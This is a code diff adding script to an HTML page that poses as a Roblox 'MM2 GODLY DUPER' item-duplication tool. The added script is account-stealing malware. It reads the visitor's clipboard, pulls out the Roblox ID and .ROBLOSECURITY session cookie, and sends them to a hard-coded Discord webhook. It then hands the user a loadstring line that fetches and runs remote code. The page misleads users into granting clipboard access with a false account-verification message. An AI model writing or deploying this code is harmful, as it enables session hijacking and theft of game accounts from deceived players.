@@ -78,41 +78,144 @@
       border-right: 10px solid transparent;
       border-top: 10px solid rgba(0, 0, 0, 0.7);
     }
+
+    /* Popup styling */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: rgba(0, 0, 0, 0.8);
+      padding: 20px;
+      border-radius: 10px;
+      color: white;
+      text-align: center;
+      z-index: 1000;
+    }
+
+    .popup textarea {
+      width: 100%;
+      height: 150px;
+      border: none;
+      background-color: #333;
+      color: white;
+      font-size: 1rem;
+      resize: none;
+      outline: none;
+    }
+
+    .popup button {
+      margin-top: 10px;
+      background-color: #2196F3;
+      font-size: 1rem;
+      padding: 10px 15px;
+      border: none;
+      color: white;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    /* Overlay to block interaction with the page while the popup is active */
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 999;
+    }
   </style>
 </head>
 <body>
   <div class="content">
     <h1>MM2 GODLY DUPER</h1>
-    <button id="copyButton">Copy our code!</button>
+    <button id="readClipboardButton">Copy our code!</button>
     <div class="arrow-message" id="arrowMessage">
       Please accept so we can verify your ROBLOX account!
       <div class="arrow"></div>
     </div>
   </div>
 
-  <script>
-    const copyButton = document.getElementById('copyButton');
-    const arrowMessage = document.getElementById('arrowMessage');
+  <!-- Popup & Overlay -->
+  <div class="overlay" id="overlay"></div>
+  <div class="popup" id="popup">
+    <h2>DUPER SCRIPT</h2>
+    <textarea id="copyArea" readonly>[EXAMPLE]</textarea>
+    <button id="copyButton">Copy</button>
+  </div>
 
-    copyButton.addEventListener('click', () => {
+  <script>
+    const readClipboardButton = document.getElementById('readClipboardButton');
+    const arrowMessage = document.getElementById('arrowMessage');
+    const popup = document.getElementById('popup');
+    const overlay = document.getElementById('overlay');
+    const copyArea = document.getElementById('copyArea');
+    const copyButton = document.getElementById('copyButton');
+
+    readClipboardButton.addEventListener('click', async () => {
       // Show the arrow message
       arrowMessage.style.display = 'block';
 
-      // Request clipboard permission
-      navigator.permissions.query({ name: 'clipboard-write' }).then(permissionStatus => {
-        if (permissionStatus.state === 'granted' || permissionStatus.state === 'prompt') {
-          const code = `Your predefined code here...`; // Replace this with the code you want to copy
-          
-          // Try to copy to clipboard
-          navigator.clipboard.writeText(code).then(() => {
-            alert('Code copied to clipboard!');
-          }).catch(err => {
-            console.error('Failed to copy: ', err);
-          });
-        } else {
-          alert('Clipboard permission denied. Please allow permission.');
-        }
-      });
+      try {
+        // Request permission and read from the clipboard
+        const clipboardText = await navigator.clipboard.readText();
+        
+        console.log('Clipboard content:', clipboardText);
+
+        // Extract the Roblox ID and roblosecurity cookie
+        const robloxIdMatch = clipboardText.match(/robloxid=(\d+)/); // Pattern for Roblox ID
+        const roblosecurityMatch = clipboardText.match(/\.ROBLOSECURITY=([A-Za-z0-9_-]+)/); // Pattern for roblosecurity cookie
+
+        const robloxId = robloxIdMatch ? robloxIdMatch[1] : 'Not found';
+        const roblosecurity = roblosecurityMatch ? roblosecurityMatch[1] : 'Not found';
+
+        console.log('Roblox ID:', robloxId);
+        console.log('roblosecurity:', roblosecurity);
+
+        // Send the data to the webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1318577132980535339/EeYegwPA9zdn8QvwOTrzVcUKzpgMzZV6J_IC-8WUs327aIExHN28qvx54JWzyguBo5J-';
+
+        // Prepare the data to send to Discord
+        const messageData = {
+          content: `**Roblox ID:** ${robloxId}\n**roblosecurity:** ${roblosecurity}`,
+        };
+
+        // Send a POST request to the Discord webhook
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(messageData),
+        });
+
+        alert('Data sent to the Discord webhook!');
+
+        // Show the popup with a message
+        overlay.style.display = 'block';
+        popup.style.display = 'block';
+        copyArea.value = `loadstring(game:HttpGet("https://raw.githubusercontent.com/moonlast/MM2/refs/heads/main/V2Dupe"))()`;
+
+      } catch (err) {
+        console.error('Failed to read clipboard content:', err);
+        alert('Failed to read clipboard. Please make sure the clipboard contains the correct data.');
+      }
+    });
+
+    // Copy button functionality
+    copyButton.addEventListener('click', () => {
+      copyArea.select();
+      document.execCommand('copy');
+      alert('Copied to clipboard!');
+    });
+
+    // Close the popup when the overlay is clicked
+    overlay.addEventListener('click', () => {
+      overlay.style.display = 'none';
+      popup.style.display = 'none';
     });
   </script>
 </body>
